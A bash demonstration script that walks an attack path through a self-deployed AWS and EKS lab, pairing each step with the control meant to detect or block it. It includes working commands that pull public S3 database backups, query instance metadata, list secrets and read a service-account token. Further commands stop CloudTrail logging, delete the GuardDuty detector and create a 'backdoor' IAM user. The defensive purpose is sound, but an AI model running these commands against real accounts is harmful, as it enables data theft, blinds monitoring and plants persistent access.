#!/usr/bin/env bash
# Simulated attack path against YOUR OWN exercise environment, to show each
# weakness, its consequence, and which control prevented or detected it.
# Only run against the lab account you deployed.
set -euo pipefail
PROJECT="${PROJECT:-wiz}"; export AWS_REGION="${AWS_REGION:-us-east-1}"
out() { aws cloudformation describe-stacks --stack-name "$PROJECT-$1" \
          --query "Stacks[0].Outputs[?OutputKey=='$2'].OutputValue" --output text; }
step() { printf '\n\033[1;31m>> %s\033[0m\n' "$*"; read -rp "(enter) " _; }

BUCKET=$(out mongodb BackupBucketName); MONGO_PUB=$(out mongodb MongoPublicIp)
KEY_ID=$(out mongodb KeyPairId); CLUSTER=$(out eks ClusterName)
aws ssm get-parameter --name "/ec2/keypair/$KEY_ID" --with-decryption \
  --query Parameter.Value --output text > /tmp/mongo.pem && chmod 600 /tmp/mongo.pem

step "A1. Anonymous internet user lists and downloads DB backups (W5)"
curl -s "https://$BUCKET.s3.$AWS_REGION.amazonaws.com/?list-type=2" | grep -o '<Key>[^<]*</Key>' | tail -3
LATEST=$(curl -s "https://$BUCKET.s3.$AWS_REGION.amazonaws.com/?list-type=2&prefix=backups/" \
         | grep -o '<Key>[^<]*</Key>' | sed 's/<[^>]*>//g' | sort | tail -1)
curl -s -o /tmp/stolen.archive.gz "https://$BUCKET.s3.$AWS_REGION.amazonaws.com/$LATEST"
echo "Downloaded $(du -h /tmp/stolen.archive.gz | cut -f1) without credentials. Field names inside:"
gunzip -c /tmp/stolen.archive.gz | strings | grep -E '^(email|password|name|go-mongodb)' | sort -u | head
echo "DETECTED BY: CloudTrail S3 data events, Config S3_BUCKET_PUBLIC_READ_PROHIBITED, Security Hub S3.2/S3.3"

step "A2. SSH open to the internet leaks an outdated OpenSSH banner (W1, W2)"
ssh-keyscan -T 5 "$MONGO_PUB" 2>&1 | grep -m1 -i openssh || true
echo "DETECTED BY: Config INCOMING_SSH_DISABLED, Security Hub EC2.13, GuardDuty SSH brute-force findings"

step "A3. Abuse the VM's over-permissive instance role (W3)"
ssh -o StrictHostKeyChecking=accept-new -i /tmp/mongo.pem "ubuntu@$MONGO_PUB" '
  set +e
  TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
  md() { curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/$1; }
  AMI=$(md ami-id); MAC=$(md mac); SUBNET=$(md network/interfaces/macs/$MAC/subnet-id)
  echo "--- identity:"; aws sts get-caller-identity --output text
  echo "--- can I launch VMs? (dry run)"
  aws ec2 run-instances --dry-run --image-id "$AMI" --instance-type t3.micro --subnet-id "$SUBNET" 2>&1 | tail -1
  echo "--- can I read every bucket?"; aws s3 ls | head -5
  echo "--- can I read secrets?"; aws secretsmanager list-secrets --query "SecretList[].Name" --output text
  echo "--- can I blind the defenders or plant a backdoor? (role is admin, but...)"
  aws cloudtrail stop-logging --name '"$PROJECT"'-trail 2>&1 | tail -1
  aws guardduty delete-detector --detector-id "$(aws guardduty list-detectors --query DetectorIds[0] --output text)" 2>&1 | tail -1
  aws iam create-user --user-name backdoor 2>&1 | tail -1'
echo "If VM_GUARDRAIL_BOUNDARY=true the last three calls show an explicit deny in a permissions boundary."
echo "DETECTED BY: EventBridge tampering rule -> SNS, CloudTrail, Config admin-access rule"

step "A4. Code execution in the app pod = cluster-admin (Kubernetes RBAC weakness)"
aws eks update-kubeconfig --name "$CLUSTER" --region "$AWS_REGION" >/dev/null
kubectl auth can-i --list --as=system:serviceaccount:tasky:tasky-sa | head -5
kubectl -n tasky exec deploy/tasky -- sh -c '
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  wget -q -O- --no-check-certificate --header "Authorization: Bearer $T" \
    https://kubernetes.default.svc/api/v1/secrets | grep -o "\"name\": \"[^\"]*\"" | head -8'
echo "DETECTED BY: EKS audit logs (CloudWatch) and GuardDuty EKS protection"

step "A5. Credential leakage: Tasky prints its full MONGODB_URI to stdout"
kubectl -n tasky logs deploy/tasky | grep -m1 "Connected to MONGO" | sed -E 's#//([^:]+):[^@]+@#//\1:****@#'
echo "Masked here - in reality the plaintext password sits in container logs."

step "P1. Preventative control: Pod Security Admission blocks a privileged pod"
kubectl -n tasky run escape --image=alpine --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"escape","image":"alpine","securityContext":{"privileged":true}}]}}' 2>&1 | tail -2 || true

step "D1. Detective pipeline: generate GuardDuty sample findings -> EventBridge -> SNS"
DET=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
aws guardduty create-sample-findings --detector-id "$DET" \
  --finding-types "UnauthorizedAccess:EC2/SSHBruteForce" "Policy:Kubernetes/AdminAccessToDefaultServiceAccount" \
  "Policy:S3/BucketAnonymousAccessGranted"
echo "Check your inbox and the GuardDuty console in ~1 minute."

step "D2. CloudTrail recorded the attempts"
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging \
  --max-results 3 --query 'Events[].{time:EventTime,user:Username,event:EventName}' --output table
echo "Anonymous S3 reads are in the trail bucket / CloudTrail Lake (data events, ~5 min delay)."
